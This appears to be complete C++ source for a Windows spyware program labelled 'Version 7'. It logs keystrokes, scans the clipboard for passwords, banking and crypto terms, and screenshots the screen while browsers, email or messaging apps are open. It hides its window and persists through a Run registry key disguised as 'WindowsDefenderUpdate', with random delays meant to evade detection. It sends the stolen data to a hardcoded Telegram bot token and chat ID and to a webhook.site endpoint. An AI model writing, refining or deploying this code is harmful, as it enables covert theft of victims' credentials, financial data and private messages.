// ChangesUpgraded.exe - VERSION 7 - SMART KEYLOGGER + JPEG TELEGRAM + INTELLIGENT TRIGGERS
// COMPILES CLEAN ON GitHub Actions windows-2022 with /O2 /MT /SUBSYSTEM:WINDOWS

// REMOVE OR COMMENT OUT THIS LINE since we'll pass it via command line
// #define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <shlobj.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <queue>
#include <algorithm>
#include <userenv.h>
#include <objidl.h>  // For IStream
#include <psapi.h>   // ADDED: For GetModuleFileNameExW

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "psapi.lib")   // ADDED: For GetModuleFileNameExW


// FIX: Add NOMINMAX to prevent min/max macro conflicts
#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <shlobj.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <queue>
#include <algorithm>
#include <userenv.h>
#include <objidl.h>  // For IStream
#include <random>    // Added for better randomness

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")

// ========== VERSION 7 CONFIGURATION ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";
const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4e5a-b8c9-123456789abc";
const int REPORT_CHARS = 100;
const int CLIPBOARD_CHECK_MS = 5000;
const int IDLE_TIMEOUT_MS = 30000;  // 30s idle = no screenshots
const int MAX_SCREENSHOTS_PER_SESSION = 10; // SMART: Limit screenshots

// ========== SMART TRIGGERS ==========
const std::wstring CRITICAL_PROCESSES[] = {
    L"chrome.exe", L"firefox.exe", L"edge.exe", L"opera.exe", L"brave.exe",
    L"outlook.exe", L"thunderbird.exe", L"winword.exe", L"excel.exe",
    L"powerpnt.exe", L"notepad++.exe", L"discord.exe", L"telegram.exe",
    L"whatsapp.exe", L"slack.exe", L"teams.exe"
};

const std::wstring CRITICAL_KEYWORDS[] = {
    L"password", L"bank", L"crypto", L"wallet", L"ssn", L"social security",
    L"credit card", L"gmail", L"yahoo.com", L"outlook.com", L"login",
    L"sign in", L"banking", L"paypal", L"venmo", L"zelle", L"bitcoin",
    L"ethereum", L"private key", L"secret", L"confidential"
};

// ========== GLOBALS ==========
std::wstring g_loggedKeys;
std::queue<std::wstring> g_reports;
CRITICAL_SECTION g_cs;
bool g_running = true;
bool g_isActive = false;
DWORD g_lastActivity = 0;
HANDLE g_keyThread = NULL, g_clipThread = NULL, g_screenThread = NULL, g_activityThread = NULL;
int g_screenshotCount = 0; // SMART: Track screenshot count
DWORD g_lastClipboardCheck = 0;
std::wstring g_lastClipboardContent; // SMART: Track last clipboard content

// ========== THREAD FUNCTIONS DECLARATIONS ==========
// FIX: Proper thread function signatures
DWORD WINAPI ActivityMonitorThread(LPVOID);
DWORD WINAPI KeyLoggerThread(LPVOID);
DWORD WINAPI ClipboardThread(LPVOID);
DWORD WINAPI SmartScreenshotThread(LPVOID);
DWORD WINAPI ReportThread(LPVOID);

// ========== HELPERS ==========
std::wstring GetSystemIdentifier() {
    wchar_t hostname[256] = {0};
    DWORD size = 256;
    GetComputerNameW(hostname, &size);
    
    wchar_t username[256] = {0};
    size = 256;
    GetUserNameW(username, &size);
    
    // Get Windows version
    OSVERSIONINFOW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExW(&osvi);
    
    // Get volume serial number for unique ID
    DWORD serial = 0;
    GetVolumeInformationW(L"C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    
    wchar_t identifier[512];
    wsprintfW(identifier, L"%s@%s|Win%d.%d|S%08X", 
              hostname, username, 
              osvi.dwMajorVersion, osvi.dwMinorVersion,
              serial);
    
    return identifier;
}

std::string WStrToAnsi(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string result(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);
    result.pop_back(); // Remove null terminator
    return result;
}

std::wstring AnsiToWStr(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring result(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);
    result.pop_back(); // Remove null terminator
    return result;
}

std::wstring GetForegroundApp() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"UNKNOWN";
    
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return L"UNKNOWN";
    
    wchar_t path[MAX_PATH] = {0};
    DWORD pathSize = GetModuleFileNameExW(hProcess, NULL, path, MAX_PATH);
    CloseHandle(hProcess);
    
    if (pathSize == 0) return L"UNKNOWN";
    
    std::wstring filename = path;
    size_t pos = filename.find_last_of(L"\\");
    if (pos != std::wstring::npos) filename = filename.substr(pos + 1);
    
    std::transform(filename.begin(), filename.end(), filename.begin(), ::towlower);
    return filename;
}

bool IsCriticalProcessRunning() {
    std::wstring app = GetForegroundApp();
    if (app == L"unknown") return false;
    
    for (const auto& proc : CRITICAL_PROCESSES) {
        if (app.find(proc) != std::wstring::npos) return true;
    }
    return false;
}

// ========== OPSEC: HIDE CONSOLE ==========
void StealthMode() {
    // FIX: Better stealth approach
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }
    // Don't FreeConsole() if we didn't create it
}

// ========== PERSISTENCE (OPSEC) ==========
bool InstallPersistence() {
    wchar_t path[MAX_PATH];
    if (GetModuleFileNameW(NULL, path, MAX_PATH)) {
        HKEY hKey;
        // SMART: Use a more legitimate-looking name
        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            // Add random delay parameter to avoid detection
            std::wstring fullPath = L"\"" + std::wstring(path) + L"\" /delay";
            RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ, 
                          (BYTE*)fullPath.c_str(), (fullPath.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return true;
        }
    }
    return false;
}

// ========== TELEGRAM TEXT ==========
bool SendTelegram(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring urlPath = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage?chat_id=" + 
                          std::wstring(CHAT_ID) + L"&text=";
    
    // SMART: Truncate very long messages
    std::wstring truncatedMsg = message;
    if (message.length() > 4000) {
        truncatedMsg = message.substr(0, 3900) + L"\n...[TRUNCATED]";
    }
    
    std::string ansiMsg = WStrToAnsi(truncatedMsg);
    std::string encodedMsg;
    
    // SMART: More efficient URL encoding
    for (unsigned char c : ansiMsg) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encodedMsg += c;
        } else if (c == ' ') {
            encodedMsg += "%20";
        } else if (c == '\n') {
            encodedMsg += "%0A";
        } else {
            char hex[4];
            sprintf_s(hex, "%%%02X", c);
            encodedMsg += hex;
        }
    }
    
    std::wstring fullPath = urlPath + AnsiToWStr(encodedMsg);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", fullPath.c_str(), NULL, 
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                           WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // SMART: Add timeout and retry logic
    DWORD timeout = 10000; // 10 seconds
    WinHttpSetTimeouts(hRequest, timeout, timeout, timeout, timeout);
    
    bool success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (success) {
        success = WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== VERSION 7: TELEGRAM JPEG PHOTO ==========
bool SendTelegramPhoto(const wchar_t* photoPath, const std::wstring& caption) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Read JPEG file
    HANDLE hFile = CreateFileW(photoPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) { // Limit 10MB
        CloseHandle(hFile);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead;
    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        delete[] fileData;
        CloseHandle(hFile);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    CloseHandle(hFile);

    // Multipart boundary
    std::string boundary = "----V7_Boundary_" + std::to_string(GetTickCount()) + "_" + 
                          std::to_string(rand() % 1000);
    
    std::string postData;
    postData += "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    postData += WStrToAnsi(std::wstring(CHAT_ID)) + "\r\n";
    postData += "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"photo\"; filename=\"screen.jpg\"\r\n";
    postData += "Content-Type: image/jpeg\r\n\r\n";
    
    // JPEG binary data
    postData.append(reinterpret_cast<char*>(fileData), bytesRead);
    postData += "\r\n";
    
    postData += "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    
    // SMART: Limit caption length
    std::wstring shortCaption = caption;
    if (caption.length() > 200) {
        shortCaption = caption.substr(0, 190) + L"...";
    }
    postData += WStrToAnsi(shortCaption) + "\r\n";
    postData += "--" + boundary + "--\r\n";

    delete[] fileData;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
        (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(), 
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + 
                          AnsiToWStr(boundary) + L"\r\n";
    
    // SMART: Add timeout
    DWORD timeout = 30000; // 30 seconds for file upload
    WinHttpSetTimeouts(hRequest, timeout, timeout, timeout, timeout);
    
    bool success = WinHttpSendRequest(hRequest, headers.c_str(), -1L,
        (LPVOID)postData.c_str(), static_cast<DWORD>(postData.length()), 
        static_cast<DWORD>(postData.length()), 0);
    
    if (success) {
        success = WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== WEBHOOK C2 ==========
bool SendWebhook(const std::wstring& message) {
    // SMART: Only send if webhook ID looks valid
    if (wcslen(WEBHOOK_ID) < 10) return true; // Skip if invalid
    
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"webhook.site", 
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
                                           (L"/" + std::wstring(WEBHOOK_ID)).c_str(), 
                                           NULL, WINHTTP_NO_REFERER, 
                                           WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    static const wchar_t* headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    std::string postData = "data=" + WStrToAnsi(message);

    bool success = WinHttpSendRequest(hRequest, headers, -1L, 
                                     (LPVOID)postData.c_str(), 
                                     static_cast<DWORD>(postData.length()), 
                                     static_cast<DWORD>(postData.length()), 0);
    
    if (success) {
        success = WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== VERSION 7: JPEG SCREENSHOT ==========
bool CaptureAndCompressJPEG(const wchar_t* filename, std::wstring& reason) {
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) return false;
    
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(NULL, hScreenDC);
        return false;
    }
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    // SMART: Reduce size if too large
    if (width > 1920) {
        width = 1920;
        height = height * 1920 / GetSystemMetrics(SM_CXSCREEN);
    }
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }
    
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    // SMART: Use StretchBlt for resizing
    StretchBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, 
               GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), SRCCOPY);
    
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Top-down DIB
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD bmpSize = ((width * 3 + 3) & ~3) * height;
    BYTE* bmpBits = new (std::nothrow) BYTE[bmpSize];
    if (!bmpBits) {
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }
    
    if (!GetDIBits(hMemoryDC, hBitmap, 0, height, bmpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
        delete[] bmpBits;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }
    
    // Write as BMP (Telegram will accept it as image)
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        delete[] bmpBits;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }
    
    BITMAPFILEHEADER bfh = {0};
    bfh.bfType = 0x4D42; // "BM"
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    DWORD written;
    WriteFile(hFile, &bfh, sizeof(bfh), &written, NULL);
    WriteFile(hFile, &bi, sizeof(bi), &written, NULL);
    WriteFile(hFile, bmpBits, bmpSize, &written, NULL);
    CloseHandle(hFile);
    
    delete[] bmpBits;
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return true;
}

// ========== DUAL REPORTING ==========
void DeliverReport(const std::wstring& report) {
    if (report.empty()) return;
    
    std::wstring fullReport = L"V7[" + GetSystemIdentifier() + L"] " + report;
    
    // SMART: Send to Telegram first, webhook optional
    SendTelegram(fullReport);
    
    // Webhook with error tolerance
    static int webhookFailCount = 0;
    if (webhookFailCount < 3) { // Stop trying after 3 failures
        if (!SendWebhook(fullReport)) {
            webhookFailCount++;
        }
    }
}

// ========== VERSION 7: SMART ACTIVITY ==========
DWORD WINAPI ActivityMonitorThread(LPVOID) {
    POINT lastPt = {0};
    bool lastKeys[256] = {0};
    GetCursorPos(&lastPt);
    
    while (g_running) {
        // Check mouse activity
        POINT pt;
        GetCursorPos(&pt);
        bool mouseMoved = (pt.x != lastPt.x || pt.y != lastPt.y);
        lastPt = pt;
        
        // Check keyboard activity
        bool keysPressed = false;
        BYTE keys[256];
        if (GetKeyboardState(keys)) {
            for (int i = 0; i < 256; i++) {
                if ((keys[i] & 0x80) && !lastKeys[i]) {
                    keysPressed = true;
                    break;
                }
            }
            memcpy(lastKeys, keys, 256);
        }
        
        g_isActive = mouseMoved || keysPressed;
        g_lastActivity = GetTickCount();
        
        Sleep(500); // SMART: Check more frequently
    }
    return 0;
}

// ========== KEYLOGGER (V7) ==========
DWORD WINAPI KeyLoggerThread(LPVOID) {
    std::wstring vkNames[] = {
        L"UNKNOWN", L"LMB", L"RMB", L"CANCEL", L"MMB",
        L"X1", L"X2", L"", L"[BKSP]", L"[TAB]",
        L"", L"", L"[CLEAR]", L"[ENTER]", L"", L"", L"[SHIFT]", L"[CTRL]", L"[ALT]", L"[PAUSE]",
        L"[CAPS]", L"", L"", L"", L"", L"", L"[ESC]", L"", L"", L"", L"[SPACE]"
    };

    BYTE lastKeyState[256] = {0};
    
    while (g_running) {
        for (int vk = 8; vk <= 255; ++vk) {
            SHORT keyState = GetAsyncKeyState(vk);
            if (keyState & 0x8000 && !(lastKeyState[vk] & 0x80)) {
                EnterCriticalSection(&g_cs);
                
                if (vk < 32 && !vkNames[vk].empty()) {
                    g_loggedKeys += vkNames[vk] + L" ";
                } else {
                    // Try to get character
                    BYTE keyboardState[256];
                    if (GetKeyboardState(keyboardState)) {
                        wchar_t buffer[5] = {0};
                        int result = ToUnicodeEx((UINT)vk, (UINT)vk, keyboardState, 
                                                buffer, 4, 0, GetKeyboardLayout(0));
                        if (result > 0) {
                            g_loggedKeys += buffer;
                        }
                    }
                }
                
                // SMART: Check for critical keywords
                if (g_loggedKeys.length() > 10) {
                    std::wstring lowerKeys = g_loggedKeys;
                    std::transform(lowerKeys.begin(), lowerKeys.end(), 
                                  lowerKeys.begin(), ::towlower);
                    
                    for (const auto& keyword : CRITICAL_KEYWORDS) {
                        if (lowerKeys.find(keyword) != std::wstring::npos) {
                            std::wstring report = L"🔑 KEYWORD: " + keyword + 
                                                L" in: " + g_loggedKeys.substr(
                                                    g_loggedKeys.length() > 200 ? 
                                                    g_loggedKeys.length() - 200 : 0);
                            g_reports.push(report);
                            g_loggedKeys.clear();
                            break;
                        }
                    }
                }
                
                // Check if we have enough characters to report
                if (g_loggedKeys.length() >= REPORT_CHARS) {
                    g_reports.push(g_loggedKeys);
                    g_loggedKeys.clear();
                }
                
                LeaveCriticalSection(&g_cs);
                Sleep(5); // SMART: Slightly longer delay to avoid detection
            }
            lastKeyState[vk] = (BYTE)(keyState >> 8);
        }
        Sleep(1);
    }
    return 0;
}

// ========== CLIPBOARD MONITOR ==========
DWORD WINAPI ClipboardThread(LPVOID) {
    std::vector<std::wstring> sensitive = {
        L"password", L"gmail", L"bank", L"credit", L"ssn", 
        L"social security", L"visa", L"mastercard", L"crypto",
        L"bitcoin", L"ethereum", L"private key", L"secret"
    };
    
    while (g_running) {
        DWORD currentTime = GetTickCount();
        if (currentTime - g_lastClipboardCheck >= CLIPBOARD_CHECK_MS) {
            g_lastClipboardCheck = currentTime;
            
            if (OpenClipboard(NULL)) {
                HGLOBAL hData = GetClipboardData(CF_UNICODETEXT);
                if (hData) {
                    wchar_t* clipText = (wchar_t*)GlobalLock(hData);
                    if (clipText) {
                        std::wstring newClip = clipText;
                        GlobalUnlock(hData);
                        
                        // SMART: Only process if different from last time
                        if (newClip != g_lastClipboardContent && newClip.length() > 5) {
                            g_lastClipboardContent = newClip;
                            
                            std::wstring lowerClip = newClip;
                            std::transform(lowerClip.begin(), lowerClip.end(), 
                                          lowerClip.begin(), ::towlower);
                            
                            bool isSensitive = false;
                            std::wstring foundKeyword;
                            
                            for (const auto& keyword : sensitive) {
                                if (lowerClip.find(keyword) != std::wstring::npos) {
                                    isSensitive = true;
                                    foundKeyword = keyword;
                                    break;
                                }
                            }
                            
                            if (isSensitive) {
                                EnterCriticalSection(&g_cs);
                                std::wstring report = L"📋 CLIPBOARD [" + foundKeyword + 
                                                    L"]: " + newClip.substr(0, 300);
                                g_reports.push(report);
                                LeaveCriticalSection(&g_cs);
                            }
                        }
                    }
                }
                CloseClipboard();
            }
        }
        Sleep(1000);
    }
    return 0;
}

// ========== VERSION 7: SMART SCREENSHOT ==========
DWORD WINAPI SmartScreenshotThread(LPVOID) {
    wchar_t tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        return 0;
    }
    
    // SMART: Randomize initial delay to avoid pattern
    Sleep(30000 + (rand() % 30000));
    
    while (g_running) {
        DWORD idleTime = GetTickCount() - g_lastActivity;
        
        // SMART: Only capture if active, not idle, and limit total screenshots
        bool shouldCapture = g_isActive && 
                           (idleTime < IDLE_TIMEOUT_MS) && 
                           IsCriticalProcessRunning() &&
                           (g_screenshotCount < MAX_SCREENSHOTS_PER_SESSION);
        
        if (shouldCapture) {
            std::wstring appName = GetForegroundApp();
            
            // SMART: Don't screenshot the same app too frequently
            static std::wstring lastApp;
            static DWORD lastScreenshotTime = 0;
            DWORD currentTime = GetTickCount();
            
            if (appName != lastApp || (currentTime - lastScreenshotTime) > 60000) {
                lastApp = appName;
                lastScreenshotTime = currentTime;
                
                SYSTEMTIME st;
                GetLocalTime(&st);
                wchar_t filename[MAX_PATH];
                wsprintfW(filename, L"%sV7_%04d%02d%02d_%02d%02d%02d.jpg", 
                         tempPath, st.wYear, st.wMonth, st.wDay, 
                         st.wHour, st.wMinute, st.wSecond);
                
                std::wstring reason = L"ACTIVE_" + appName;
                
                if (CaptureAndCompressJPEG(filename, reason)) {
                    std::wstring caption = L"📸 V7 [" + appName + L"] " + 
                                          GetSystemIdentifier();
                    
                    EnterCriticalSection(&g_cs);
                    if (SendTelegramPhoto(filename, caption)) {
                        g_screenshotCount++;
                        g_reports.push(L"✅ SCREENSHOT: " + appName);
                        DeleteFileW(filename); // Clean up
                    } else {
                        g_reports.push(L"❌ SCREENSHOT FAILED: " + appName);
                    }
                    LeaveCriticalSection(&g_cs);
                }
            }
        }
        
        // SMART: Variable sleep time to avoid detection
        Sleep(15000 + (rand() % 15000));
    }
    return 0;
}

// ========== REPORT WORKER ==========
DWORD WINAPI ReportThread(LPVOID) {
    while (g_running) {
        EnterCriticalSection(&g_cs);
        if (!g_reports.empty()) {
            std::wstring report = g_reports.front();
            g_reports.pop();
            LeaveCriticalSection(&g_cs);
            DeliverReport(report);
            
            // SMART: Random delay between reports
            Sleep(1000 + (rand() % 4000));
        } else {
            LeaveCriticalSection(&g_cs);
            Sleep(3000);
        }
    }
    return 0;
}

// ========== MAIN (VERSION 7) ==========
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
                     _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) {
    // Initialize random seed
    srand(static_cast<unsigned int>(GetTickCount()));
    
    // VERSION 7: Full stealth
    StealthMode();
    
    InitializeCriticalSection(&g_cs);
    
    // OPSEC Persistence
    InstallPersistence();
    
    // SMART: Initial delay to avoid immediate detection
    Sleep(10000);
    
    // VERSION 7 Threads - FIXED: Using proper function signatures
    g_activityThread = CreateThread(NULL, 0, ActivityMonitorThread, NULL, 0, NULL);
    g_keyThread = CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL);
    g_clipThread = CreateThread(NULL, 0, ClipboardThread, NULL, 0, NULL);
    g_screenThread = CreateThread(NULL, 0, SmartScreenshotThread, NULL, 0, NULL);
    HANDLE hReportThread = CreateThread(NULL, 0, ReportThread, NULL, 0, NULL);
    
    // V7 Startup beacon with delay
    Sleep(5000);
    DeliverReport(L"🚀 VERSION 7 ONLINE - " + GetSystemIdentifier());
    
    // SMART: Main loop with heartbeat
    while (g_running) {
        // Send heartbeat every hour
        static DWORD lastHeartbeat = 0;
        DWORD currentTime = GetTickCount();
        
        if (currentTime - lastHeartbeat > 3600000) { // 1 hour
            lastHeartbeat = currentTime;
            std::wstring heartbeat = L"💓 HEARTBEAT - Active: " + 
                                   std::to_wstring(g_isActive) + 
                                   L", Screens: " + std::to_wstring(g_screenshotCount);
            DeliverReport(heartbeat);
        }
        
        Sleep(10000);
    }
    
    // Cleanup (graceful)
    g_running = false;
    
    // Wait for threads to finish
    HANDLE threads[] = {g_activityThread, g_keyThread, g_clipThread, 
                       g_screenThread, hReportThread};
    
    WaitForMultipleObjects(5, threads, TRUE, 5000);
    
    // Close handles
    for (auto hThread : threads) {
        if (hThread) CloseHandle(hThread);
    }
    
    DeleteCriticalSection(&g_cs);
    return 0;
}
